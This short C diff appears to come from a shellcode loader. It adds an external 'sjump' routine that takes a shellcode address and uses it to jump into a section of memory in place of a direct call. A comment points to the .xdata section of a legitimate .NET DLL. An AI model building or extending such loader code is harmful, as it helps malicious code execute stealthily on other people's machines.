@@ -3,6 +3,8 @@
 
 #include "resource.h"
 
+EXTERN_C PVOID sjump(IN PVOID shellcode_address);
+
 // C:\Users\user\AppData\Local\AzureFunctionsTools\Releases\2.60.0\cli_x64\System.Private.CoreLib.dll  [.xdata]
 
 int main(int argc, char ** argv) {
@@ -46,8 +48,8 @@ int main(int argc, char ** argv) {
             }
 
             // Jump to the section
-            ((void (*)(void))sectionBase)();
-            break;
+            // ((void (*)(void))sectionBase)();
+            sjump(sectionBase);
         }
     }
 
